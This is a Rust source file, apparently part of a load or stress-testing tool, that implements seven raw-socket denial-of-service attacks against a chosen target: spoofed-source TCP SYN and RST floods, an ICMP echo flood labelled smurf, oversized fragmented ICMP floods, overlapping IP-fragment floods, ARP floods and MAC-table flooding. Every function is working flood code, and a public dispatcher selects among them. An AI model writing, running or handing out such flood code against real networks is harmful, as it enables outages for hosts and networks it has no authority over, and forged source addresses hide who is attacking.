use std::net::ToSocketAddrs;
use std::time::Duration;
use rand::RngExt;
use tokio::time;

// ---------------------------------------------------------------------------
// Helper functions
// ---------------------------------------------------------------------------

/// Standard Internet checksum: one's complement of one's complement sum of 16-bit words.
fn ip_checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;
    while i + 1 < data.len() {
        let word = u16::from(data[i]) << 8 | u16::from(data[i + 1]);
        sum = sum.wrapping_add(u32::from(word));
        i += 2;
    }
    // Odd-length: pad with a trailing zero byte
    if i < data.len() {
        let word = u16::from(data[i]) << 8;
        sum = sum.wrapping_add(u32::from(word));
    }
    // Fold 32-bit sum to 16 bits
    while (sum >> 16) != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !(sum as u16)
}

/// Generate a random IPv4 address (avoiding reserved ranges).
fn random_ip() -> [u8; 4] {
    let mut rng = rand::rng();
    loop {
        let ip: [u8; 4] = rng.random();
        // Skip 0.x, 127.x, 224-255.x (multicast/reserved)
        if !matches!(ip[0], 0 | 127 | 224..=255) {
            return ip;
        }
    }
}

/// Generate a random unicast, locally-administered MAC address.
fn random_mac() -> [u8; 6] {
    let mut rng = rand::rng();
    let mut mac: [u8; 6] = rng.random();
    mac[0] &= 0xFE; // unicast
    mac[0] |= 0x02; // locally administered
    mac
}

/// Parse a `host:port` string into an IPv4 address (4 bytes) and port.
///
/// # Panics
/// If the address cannot be resolved or is an IPv6 address.
fn parse_target(target: &str) -> ([u8; 4], u16) {
    let addr = target
        .to_socket_addrs()
        .unwrap_or_else(|e| panic!("  Failed to resolve target '{}': {}", target, e))
        .next()
        .unwrap_or_else(|| panic!("  No addresses found for target '{}'", target));

    match addr.ip() {
        std::net::IpAddr::V4(v4) => (v4.octets(), addr.port()),
        _ => panic!("  IPv6 is not supported for raw socket operations"),
    }
}

/// Convert a `[u8; 4]` IPv4 address into a `libc::in_addr`.
fn ip_to_in_addr(ip: [u8; 4]) -> libc::in_addr {
    libc::in_addr {
        s_addr: u32::from_be_bytes(ip),
    }
}

// ---------------------------------------------------------------------------
// RawMode enum
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RawMode {
    TcpSynFlood,
    TcpRstFlood,
    IcmpSmurf,
    IcmpFragmentation,
    IpFragOverload,
    ArpFlood,
    MacFlooding,
}

impl RawMode {
    pub fn from_str(s: &str) -> Option<Self> {
        match s {
            "tcp-syn-flood" | "tcpsyn" | "syn-flood" => Some(Self::TcpSynFlood),
            "tcp-rst-flood" | "tcprst" | "rst-flood" => Some(Self::TcpRstFlood),
            "icmp-smurf" | "smurf" | "icmpsmurf" => Some(Self::IcmpSmurf),
            "icmp-fragmentation" | "icmpfrag" => Some(Self::IcmpFragmentation),
            "ip-frag-overload" | "ipfrag" | "frag-overload" => Some(Self::IpFragOverload),
            "arp-flood" | "arpflood" => Some(Self::ArpFlood),
            "mac-flooding" | "macflood" | "mac-flood" => Some(Self::MacFlooding),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::TcpSynFlood => "tcp-syn-flood",
            Self::TcpRstFlood => "tcp-rst-flood",
            Self::IcmpSmurf => "icmp-smurf",
            Self::IcmpFragmentation => "icmp-fragmentation",
            Self::IpFragOverload => "ip-frag-overload",
            Self::ArpFlood => "arp-flood",
            Self::MacFlooding => "mac-flooding",
        }
    }
}

// ---------------------------------------------------------------------------
// TCP SYN Flood
// ---------------------------------------------------------------------------

async fn tcp_syn_flood(target: &str, concurrency: usize, duration_secs: u64) {
    let (dst_ip, dst_port) = parse_target(target);
    println!("  [TCP SYN Flood] target={}:{}, concurrency={}, duration={}s", 
        std::net::Ipv4Addr::from(dst_ip), dst_port, concurrency, duration_secs);

    let fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_RAW) };
    if fd < 0 {
        eprintln!("  [TCP SYN Flood] Failed to create raw socket: {}", std::io::Error::last_os_error());
        return;
    }

    let optval: libc::c_int = 1;
    let ret = unsafe {
        libc::setsockopt(
            fd,
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &optval as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        )
    };
    if ret < 0 {
        eprintln!("  [TCP SYN Flood] Failed to set IP_HDRINCL: {}", std::io::Error::last_os_error());
        unsafe { libc::close(fd); }
        return;
    }

    // Pre-build IP header template (20 bytes)
    let mut ip_hdr = [0u8; 20];
    ip_hdr[0] = 0x45;          // Version=4, IHL=5
    ip_hdr[1] = 0;             // DSCP/ECN
    ip_hdr[2] = 0;             // Total Length high byte
    ip_hdr[3] = 40;            // Total Length low byte = 40
    ip_hdr[8] = 64;            // TTL
    ip_hdr[9] = libc::IPPROTO_TCP as u8; // Protocol = TCP

    // Pre-build TCP header template (20 bytes)
    let mut tcp_hdr = [0u8; 20];
    tcp_hdr[12] = 0x50;        // Data offset = 5 (20 bytes)
    tcp_hdr[13] = 0x02;        // SYN flag
    tcp_hdr[14] = 0xFF;        // Window high
    tcp_hdr[15] = 0xFF;        // Window low = 65535

    // Destination sockaddr
    let mut addr: libc::sockaddr_in = unsafe { std::mem::zeroed() };
    addr.sin_family = libc::AF_INET as libc::sa_family_t;
    addr.sin_port = dst_port.to_be();
    addr.sin_addr = ip_to_in_addr(dst_ip);

    let start = std::time::Instant::now();
    let mut rng = rand::rng();
    let mut packet = [0u8; 40];
    let addr_size = std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t;

    while start.elapsed().as_secs() < duration_secs {
        for _ in 0..concurrency {
            // --- IP header ---
            // Identification
            let id: u16 = rng.random();
            ip_hdr[4..6].copy_from_slice(&id.to_be_bytes());
            // Fragment: DF=0, MF=0, offset=0
            ip_hdr[6] = 0;
            ip_hdr[7] = 0;
            // Source IP (spoofed)
            ip_hdr[12..16].copy_from_slice(&random_ip());
            // Dest IP
            ip_hdr[16..20].copy_from_slice(&dst_ip);
            // Checksum (clear then compute)
            ip_hdr[10] = 0;
            ip_hdr[11] = 0;
            let csum = ip_checksum(&ip_hdr);
            ip_hdr[10..12].copy_from_slice(&csum.to_be_bytes());

            // --- TCP header ---
            // Source port
            let src_port: u16 = rng.random();
            tcp_hdr[0..2].copy_from_slice(&src_port.to_be_bytes());
            // Dest port
            tcp_hdr[2..4].copy_from_slice(&dst_port.to_be_bytes());
            // Sequence number
            let seq: u32 = rng.random();
            tcp_hdr[4..8].copy_from_slice(&seq.to_be_bytes());
            // ACK = 0 (no ack in SYN)
            tcp_hdr[8..12].copy_from_slice(&[0u8; 4]);
            // Checksum = 0 (receiver may still accept, and computing TCP checksum
            // requires the pseudo-header; for a flood tool this is acceptable)
            tcp_hdr[16] = 0;
            tcp_hdr[17] = 0;
            // Urgent pointer
            tcp_hdr[18] = 0;
            tcp_hdr[19] = 0;

            // Assemble
            packet[..20].copy_from_slice(&ip_hdr);
            packet[20..40].copy_from_slice(&tcp_hdr);

            unsafe {
                libc::sendto(
                    fd,
                    &packet as *const _ as *const libc::c_void,
                    packet.len(),
                    0,
                    &addr as *const _ as *const libc::sockaddr,
                    addr_size,
                );
            }
        }
        time::sleep(Duration::from_millis(10)).await;
    }

    unsafe { libc::close(fd); }
    println!("  [TCP SYN Flood] Finished.");
}

// ---------------------------------------------------------------------------
// TCP RST Flood
// ---------------------------------------------------------------------------

async fn tcp_rst_flood(target: &str, concurrency: usize, duration_secs: u64) {
    let (dst_ip, dst_port) = parse_target(target);
    println!("  [TCP RST Flood] target={}:{}, concurrency={}, duration={}s",
        std::net::Ipv4Addr::from(dst_ip), dst_port, concurrency, duration_secs);

    let fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_RAW) };
    if fd < 0 {
        eprintln!("  [TCP RST Flood] Failed to create raw socket: {}", std::io::Error::last_os_error());
        return;
    }

    let optval: libc::c_int = 1;
    let ret = unsafe {
        libc::setsockopt(
            fd,
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &optval as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        )
    };
    if ret < 0 {
        eprintln!("  [TCP RST Flood] Failed to set IP_HDRINCL: {}", std::io::Error::last_os_error());
        unsafe { libc::close(fd); }
        return;
    }

    // IP header template
    let mut ip_hdr = [0u8; 20];
    ip_hdr[0] = 0x45;
    ip_hdr[3] = 40;
    ip_hdr[8] = 64;
    ip_hdr[9] = libc::IPPROTO_TCP as u8;

    // TCP header template — RST flag (0x04)
    let mut tcp_hdr = [0u8; 20];
    tcp_hdr[12] = 0x50;
    tcp_hdr[13] = 0x04;        // RST flag
    tcp_hdr[14] = 0xFF;
    tcp_hdr[15] = 0xFF;

    let mut addr: libc::sockaddr_in = unsafe { std::mem::zeroed() };
    addr.sin_family = libc::AF_INET as libc::sa_family_t;
    addr.sin_port = dst_port.to_be();
    addr.sin_addr = ip_to_in_addr(dst_ip);

    let start = std::time::Instant::now();
    let mut rng = rand::rng();
    let mut packet = [0u8; 40];
    let addr_size = std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t;

    while start.elapsed().as_secs() < duration_secs {
        for _ in 0..concurrency {
            let id: u16 = rng.random();
            ip_hdr[4..6].copy_from_slice(&id.to_be_bytes());
            ip_hdr[6] = 0;
            ip_hdr[7] = 0;
            ip_hdr[12..16].copy_from_slice(&random_ip());
            ip_hdr[16..20].copy_from_slice(&dst_ip);
            ip_hdr[10] = 0;
            ip_hdr[11] = 0;
            let csum = ip_checksum(&ip_hdr);
            ip_hdr[10..12].copy_from_slice(&csum.to_be_bytes());

            let src_port: u16 = rng.random();
            tcp_hdr[0..2].copy_from_slice(&src_port.to_be_bytes());
            tcp_hdr[2..4].copy_from_slice(&dst_port.to_be_bytes());
            let seq: u32 = rng.random();
            tcp_hdr[4..8].copy_from_slice(&seq.to_be_bytes());
            tcp_hdr[8..12].copy_from_slice(&[0u8; 4]);
            tcp_hdr[16] = 0;
            tcp_hdr[17] = 0;
            tcp_hdr[18] = 0;
            tcp_hdr[19] = 0;

            packet[..20].copy_from_slice(&ip_hdr);
            packet[20..40].copy_from_slice(&tcp_hdr);

            unsafe {
                libc::sendto(
                    fd,
                    &packet as *const _ as *const libc::c_void,
                    packet.len(),
                    0,
                    &addr as *const _ as *const libc::sockaddr,
                    addr_size,
                );
            }
        }
        time::sleep(Duration::from_millis(10)).await;
    }

    unsafe { libc::close(fd); }
    println!("  [TCP RST Flood] Finished.");
}

// ---------------------------------------------------------------------------
// ICMP Smurf
// ---------------------------------------------------------------------------

async fn icmp_smurf(target: &str, concurrency: usize, duration_secs: u64) {
    let (dst_ip, _dst_port) = parse_target(target);
    println!("  [ICMP Smurf] target={}, concurrency={}, duration={}s",
        std::net::Ipv4Addr::from(dst_ip), concurrency, duration_secs);

    // Use IPPROTO_ICMP raw socket (note: kernel sets the source IP; full
    // spoofing would require IPPROTO_RAW + IP_HDRINCL)
    let fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_ICMP) };
    if fd < 0 {
        eprintln!("  [ICMP Smurf] Failed to create ICMP socket: {}", std::io::Error::last_os_error());
        return;
    }

    // Build ICMP Echo Request (type=8, code=0) with 56 bytes of payload
    let mut icmp_pkt = vec![0u8; 64];
    icmp_pkt[0] = 8;  // Type: Echo Request
    icmp_pkt[1] = 0;  // Code: 0

    let mut addr: libc::sockaddr_in = unsafe { std::mem::zeroed() };
    addr.sin_family = libc::AF_INET as libc::sa_family_t;
    addr.sin_port = 0;
    addr.sin_addr = ip_to_in_addr(dst_ip);

    let start = std::time::Instant::now();
    let mut rng = rand::rng();
    let addr_size = std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t;

    while start.elapsed().as_secs() < duration_secs {
        for _ in 0..concurrency {
            let id: u16 = rng.random();
            let seq: u16 = rng.random();
            icmp_pkt[4..6].copy_from_slice(&id.to_be_bytes());   // Identifier
            icmp_pkt[6..8].copy_from_slice(&seq.to_be_bytes());  // Sequence

            // Compute ICMP checksum (covers header + payload)
            icmp_pkt[2] = 0;
            icmp_pkt[3] = 0;
            let csum = ip_checksum(&icmp_pkt);
            icmp_pkt[2..4].copy_from_slice(&csum.to_be_bytes());

            unsafe {
                libc::sendto(
                    fd,
                    &icmp_pkt as *const _ as *const libc::c_void,
                    icmp_pkt.len(),
                    0,
                    &addr as *const _ as *const libc::sockaddr,
                    addr_size,
                );
            }
        }
        time::sleep(Duration::from_millis(10)).await;
    }

    unsafe { libc::close(fd); }
    println!("  [ICMP Smurf] Finished.");
}

// ---------------------------------------------------------------------------
// ICMP Fragmentation (large echo requests requiring fragmentation)
// ---------------------------------------------------------------------------

async fn icmp_fragmentation(target: &str, concurrency: usize, duration_secs: u64) {
    let (dst_ip, _dst_port) = parse_target(target);
    println!("  [ICMP Fragmentation] target={}, concurrency={}, duration={}s",
        std::net::Ipv4Addr::from(dst_ip), concurrency, duration_secs);

    let fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_ICMP) };
    if fd < 0 {
        eprintln!("  [ICMP Fragmentation] Failed to create ICMP socket: {}", std::io::Error::last_os_error());
        return;
    }

    // Large ICMP Echo Request — 2008 bytes header+payload (fragments on most links)
    let mut icmp_pkt = vec![0u8; 2008];
    icmp_pkt[0] = 8;  // Type: Echo Request
    icmp_pkt[1] = 0;  // Code: 0

    let mut addr: libc::sockaddr_in = unsafe { std::mem::zeroed() };
    addr.sin_family = libc::AF_INET as libc::sa_family_t;
    addr.sin_port = 0;
    addr.sin_addr = ip_to_in_addr(dst_ip);

    let start = std::time::Instant::now();
    let mut rng = rand::rng();
    let addr_size = std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t;
    let payload_len = icmp_pkt.len();

    while start.elapsed().as_secs() < duration_secs {
        for _ in 0..concurrency {
            let id: u16 = rng.random();
            let seq: u16 = rng.random();
            icmp_pkt[4..6].copy_from_slice(&id.to_be_bytes());
            icmp_pkt[6..8].copy_from_slice(&seq.to_be_bytes());

            icmp_pkt[2] = 0;
            icmp_pkt[3] = 0;
            let csum = ip_checksum(&icmp_pkt);
            icmp_pkt[2..4].copy_from_slice(&csum.to_be_bytes());

            unsafe {
                libc::sendto(
                    fd,
                    &icmp_pkt as *const _ as *const libc::c_void,
                    payload_len,
                    0,
                    &addr as *const _ as *const libc::sockaddr,
                    addr_size,
                );
            }
        }
        time::sleep(Duration::from_millis(10)).await;
    }

    unsafe { libc::close(fd); }
    println!("  [ICMP Fragmentation] Finished.");
}

// ---------------------------------------------------------------------------
// IP Fragmentation Overload (overlapping IP fragments)
// ---------------------------------------------------------------------------

async fn ip_frag_overload(target: &str, concurrency: usize, duration_secs: u64) {
    let (dst_ip, _dst_port) = parse_target(target);
    println!("  [IP Frag Overload] target={}, concurrency={}, duration={}s",
        std::net::Ipv4Addr::from(dst_ip), concurrency, duration_secs);

    let fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_RAW) };
    if fd < 0 {
        eprintln!("  [IP Frag Overload] Failed to create raw socket: {}", std::io::Error::last_os_error());
        return;
    }

    let optval: libc::c_int = 1;
    let ret = unsafe {
        libc::setsockopt(
            fd,
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &optval as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        )
    };
    if ret < 0 {
        eprintln!("  [IP Frag Overload] Failed to set IP_HDRINCL: {}", std::io::Error::last_os_error());
        unsafe { libc::close(fd); }
        return;
    }

    // Fragment 1: offset=0, MF=1 (more fragments), carries 24 bytes of data
    // Fragment 2: offset=2 (overlap at byte 16), MF=0, carries more data
    // Same IP identification for both
    let mut frag1 = [0u8; 44]; // 20 IP header + 24 payload
    let mut frag2 = [0u8; 44]; // 20 IP header + 24 payload

    // Shared IP header base
    let mut ip_base = [0u8; 20];
    ip_base[0] = 0x45;
    ip_base[8] = 64;
    ip_base[9] = libc::IPPROTO_ICMP as u8; // Protocol doesn't matter for the attack

    let mut addr: libc::sockaddr_in = unsafe { std::mem::zeroed() };
    addr.sin_family = libc::AF_INET as libc::sa_family_t;
    addr.sin_port = 0;
    addr.sin_addr = ip_to_in_addr(dst_ip);

    let start = std::time::Instant::now();
    let mut rng = rand::rng();
    let addr_size = std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t;

    while start.elapsed().as_secs() < duration_secs {
        for _ in 0..concurrency {
            let id: u16 = rng.random();
            let src_ip = random_ip();

            // --- Fragment 1: offset=0, MF=1, total_len=44 ---
            let mut hdr = ip_base;
            hdr[2] = 0;
            hdr[3] = 44;                        // Total length
            hdr[4..6].copy_from_slice(&id.to_be_bytes());
            hdr[6] = 0x20;                      // Flags: MF=1 (bit 2)
            hdr[7] = 0;                         // Fragment offset = 0
            hdr[12..16].copy_from_slice(&src_ip);
            hdr[16..20].copy_from_slice(&dst_ip);
            hdr[10] = 0;
            hdr[11] = 0;
            let csum = ip_checksum(&hdr);
            hdr[10..12].copy_from_slice(&csum.to_be_bytes());

            frag1[..20].copy_from_slice(&hdr);

            unsafe {
                libc::sendto(
                    fd,
                    &frag1 as *const _ as *const libc::c_void,
                    frag1.len(),
                    0,
                    &addr as *const _ as *const libc::sockaddr,
                    addr_size,
                );
            }

            // --- Fragment 2: offset=2 (byte 16), MF=0, overlapping ---
            let mut hdr2 = ip_base;
            hdr2[2] = 0;
            hdr2[3] = 44;                        // Total length
            hdr2[4..6].copy_from_slice(&id.to_be_bytes());
            hdr2[6] = 0x00;                      // Flags: MF=0
            hdr2[7] = 2 << 3;                    // Fragment offset = 2 (16 bytes) — overlapping!
            hdr2[12..16].copy_from_slice(&src_ip);
            hdr2[16..20].copy_from_slice(&dst_ip);
            hdr2[10] = 0;
            hdr2[11] = 0;
            let csum2 = ip_checksum(&hdr2);
            hdr2[10..12].copy_from_slice(&csum2.to_be_bytes());

            frag2[..20].copy_from_slice(&hdr2);

            unsafe {
                libc::sendto(
                    fd,
                    &frag2 as *const _ as *const libc::c_void,
                    frag2.len(),
                    0,
                    &addr as *const _ as *const libc::sockaddr,
                    addr_size,
                );
            }
        }
        time::sleep(Duration::from_millis(20)).await;
    }

    unsafe { libc::close(fd); }
    println!("  [IP Frag Overload] Finished.");
}

// ---------------------------------------------------------------------------
// ARP Flood
// ---------------------------------------------------------------------------

async fn arp_flood(target: &str, concurrency: usize, duration_secs: u64) {
    let (dst_ip, _dst_port) = parse_target(target);
    println!("  [ARP Flood] target={}, concurrency={}, duration={}s",
        std::net::Ipv4Addr::from(dst_ip), concurrency, duration_secs);

    // AF_PACKET socket for raw Ethernet frames, protocol ETH_P_ARP (network order)
    let fd = unsafe {
        libc::socket(
            libc::AF_PACKET,
            libc::SOCK_RAW,
            (libc::ETH_P_ARP as u16).to_be() as i32,
        )
    };
    if fd < 0 {
        eprintln!("  [ARP Flood] Failed to create AF_PACKET socket (need root): {}", std::io::Error::last_os_error());
        return;
    }

    // Build Ethernet frame + ARP request
    let mut frame = vec![0u8; 42]; // 14 eth header + 28 ARP payload

    // Ethernet header
    let eth_broadcast = [0xFFu8; 6];
    frame[0..6].copy_from_slice(&eth_broadcast); // dst = broadcast
    // src MAC filled per-packet
    frame[12..14].copy_from_slice(&0x0806u16.to_be_bytes()); // EtherType = ARP

    // ARP header: htype=1 (Ethernet), ptype=0x0800 (IPv4), hlen=6, plen=4, op=1 (request)
    frame[14..16].copy_from_slice(&1u16.to_be_bytes());     // htype
    frame[16..18].copy_from_slice(&0x0800u16.to_be_bytes()); // ptype
    frame[18] = 6;                                           // hlen
    frame[19] = 4;                                           // plen
    frame[20..22].copy_from_slice(&1u16.to_be_bytes());     // op = request

    // Sender info filled per-packet
    // Target MAC = 00:00:00:00:00:00 (unknown)
    // Target IP
    frame[38..42].copy_from_slice(&dst_ip);

    // sockaddr_ll for sendto
    let mut sll: libc::sockaddr_ll = unsafe { std::mem::zeroed() };
    sll.sll_family = libc::AF_PACKET as u16;
    sll.sll_protocol = (libc::ETH_P_ARP as u16).to_be();
    sll.sll_ifindex = 0; // any interface
    sll.sll_halen = 6;
    sll.sll_addr = [0xFF; 8]; // broadcast

    let start = std::time::Instant::now();
    let sll_size = std::mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t;

    while start.elapsed().as_secs() < duration_secs {
        for _ in 0..concurrency {
            let src_mac = random_mac();
            let sender_ip = random_ip();

            // Ethernet source MAC
            frame[6..12].copy_from_slice(&src_mac);

            // ARP sender MAC
            frame[22..28].copy_from_slice(&src_mac);
            // ARP sender IP
            frame[28..32].copy_from_slice(&sender_ip);
            // ARP target MAC (unknown)
            frame[32..38].copy_from_slice(&[0u8; 6]);

            unsafe {
                libc::sendto(
                    fd,
                    &frame as *const _ as *const libc::c_void,
                    frame.len(),
                    0,
                    &sll as *const _ as *const libc::sockaddr,
                    sll_size,
                );
            }
        }
        time::sleep(Duration::from_millis(10)).await;
    }

    unsafe { libc::close(fd); }
    println!("  [ARP Flood] Finished.");
}

// ---------------------------------------------------------------------------
// MAC Flooding
// ---------------------------------------------------------------------------

async fn mac_flooding(target: &str, concurrency: usize, duration_secs: u64) {
    let (_dst_ip, _dst_port) = parse_target(target);
    println!("  [MAC Flooding] concurrency={}, duration={}s", concurrency, duration_secs);

    // AF_PACKET socket for raw Ethernet frames
    let fd = unsafe {
        libc::socket(
            libc::AF_PACKET,
            libc::SOCK_RAW,
            (libc::ETH_P_ALL as u16).to_be() as i32,
        )
    };
    if fd < 0 {
        eprintln!("  [MAC Flooding] Failed to create AF_PACKET socket (need root): {}", std::io::Error::last_os_error());
        return;
    }

    // Minimal Ethernet frame: 14-byte header + minimal payload
    let mut frame = vec![0u8; 60]; // minimum Ethernet frame size

    // Dummy ethertype
    frame[12..14].copy_from_slice(&0x0800u16.to_be_bytes());

    let mut sll: libc::sockaddr_ll = unsafe { std::mem::zeroed() };
    sll.sll_family = libc::AF_PACKET as u16;
    sll.sll_protocol = (libc::ETH_P_ALL as u16).to_be();
    sll.sll_ifindex = 0;
    sll.sll_halen = 6;
    sll.sll_addr = [0xFF; 8];

    let start = std::time::Instant::now();
    let sll_size = std::mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t;

    while start.elapsed().as_secs() < duration_secs {
        for _ in 0..concurrency {
            let dst_mac = random_mac();
            let src_mac = random_mac();

            // Random destination MAC
            frame[0..6].copy_from_slice(&dst_mac);
            // Random source MAC
            frame[6..12].copy_from_slice(&src_mac);

            unsafe {
                libc::sendto(
                    fd,
                    &frame as *const _ as *const libc::c_void,
                    frame.len(),
                    0,
                    &sll as *const _ as *const libc::sockaddr,
                    sll_size,
                );
            }
        }
        time::sleep(Duration::from_millis(5)).await;
    }

    unsafe { libc::close(fd); }
    println!("  [MAC Flooding] Finished.");
}

// ---------------------------------------------------------------------------
// Public dispatch
// ---------------------------------------------------------------------------

pub(crate) async fn run_raw_load(mode: RawMode, target: &str, concurrency: usize, duration_secs: u64) {
    // Check root (CAP_NET_RAW) — warn but don't abort
    let uid = unsafe { libc::geteuid() };
    if uid != 0 {
        println!("  Warning: not running as root — raw socket operations require CAP_NET_RAW and will likely fail.");
    }

    match mode {
        RawMode::TcpSynFlood => tcp_syn_flood(target, concurrency, duration_secs).await,
        RawMode::TcpRstFlood => tcp_rst_flood(target, concurrency, duration_secs).await,
        RawMode::IcmpSmurf => icmp_smurf(target, concurrency, duration_secs).await,
        RawMode::IcmpFragmentation => icmp_fragmentation(target, concurrency, duration_secs).await,
        RawMode::IpFragOverload => ip_frag_overload(target, concurrency, duration_secs).await,
        RawMode::ArpFlood => arp_flood(target, concurrency, duration_secs).await,
        RawMode::MacFlooding => mac_flooding(target, concurrency, duration_secs).await,
    }
}
